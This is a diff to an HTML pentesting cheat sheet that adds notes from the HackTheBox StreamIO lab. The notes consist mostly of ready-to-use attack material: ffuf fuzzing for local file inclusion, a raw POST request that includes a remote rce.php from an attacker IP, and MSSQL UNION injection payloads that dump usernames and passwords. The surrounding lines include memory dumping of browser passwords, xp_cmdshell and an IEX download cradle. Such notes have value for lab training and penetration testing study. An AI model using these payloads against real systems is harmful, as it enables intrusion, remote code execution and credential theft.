@@ -279,7 +279,9 @@ LISTEN: Specifies that socat should listen for incoming connections on the socke
 
 </code></pre>
 <h3 id="find-things"><a class="header" href="#find-things">Find Things</a></h3>
-<pre><code># Getting passwords from browser memory
+<pre><code>dir -recurse *.php | select-string -pattern "database"
+
+# Getting passwords from browser memory
 procdump.exe -ma firefox_pid
 strings.exe firefox.dmp | findstr /i "Passwd="
 
@@ -4956,6 +4958,41 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 
 
 </code></pre>
+<h3 id="notes-from-htb-streamio-for-lfi"><a class="header" href="#notes-from-htb-streamio-for-lfi">Notes from HTB StreamIO for LFI</a></h3>
+<pre><code>If you see this, maybe you can LFI: **?user=**
+
+Fuzz it:
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?message=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/index.php?FUZZ= -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678
+
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?debug=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1712
+
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://streamio.htb/admin/FUZZ.php -b PHPSESSID=8ldbs678ajgeum49okb767249a
+
+
+
+Also worth noting here, once we figured out we could do LFI via the include command, I used burp to repeat, changed from GET to POST, and added the include line at the end, but still needed to also manually add the Content:type line:
+
+POST /admin/index.php?debug=master.php HTTP/2
+Host: streamio.htb
+Cookie: PHPSESSID=9acr1fp7e2rjcfnhgat8l8hnfs
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+include=http://10.10.14.76/rce.php
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="1-local-file-inclusion"><a class="header" href="#1-local-file-inclusion">1 Local File inclusion</a></h1>
 <hr />
 <ul>
@@ -5415,6 +5452,32 @@ EXECUTE xp_cmdshell 'whoami';
 <li><strong>Method</strong>: Use SQL commands that delay the response.</li>
 <li><strong>Example</strong>: <code>'; IF (SELECT COUNT(*) FROM users) &gt; 5 WAITFOR DELAY '0:0:10' --</code>. If the response is delayed, the statement is true.</li>
 </ul>
+<h3 id="notes-from-htb-streamio"><a class="header" href="#notes-from-htb-streamio">Notes from HTB StreamIO</a></h3>
+<pre><code>It was MSSQL, and ended up blocking just 'OR' but not 'AND'
+
+1408' OR 1=1     # BLocked
+
+## Trial and Error to figure out there are six columns
+-1' UNION SELECT 1,2,3,4,5,6--
+
+## Get Version
+-1' UNION SELECT 1,@@version,3,4,5,6--
+
+## Get list of Databases
+-1' UNION SELECT 1,name,3,4,5,6  FROM master.dbo.sysdatabases--
+
+## Dig into the streamio database
+-1' UNION SELECT 1,name,3,4,5,6  FROM streamio..sysobjects WHERE xtype ='U';-- -
+
+-1' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
+
+-1' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM users;-- -
+
+
+Interesting way to quick connect to a database, mssql, on cli and get data you need:
+
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h3 id="sql-injections"><a class="header" href="#sql-injections">SQL Injections</a></h3>
 <h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
 <hr />
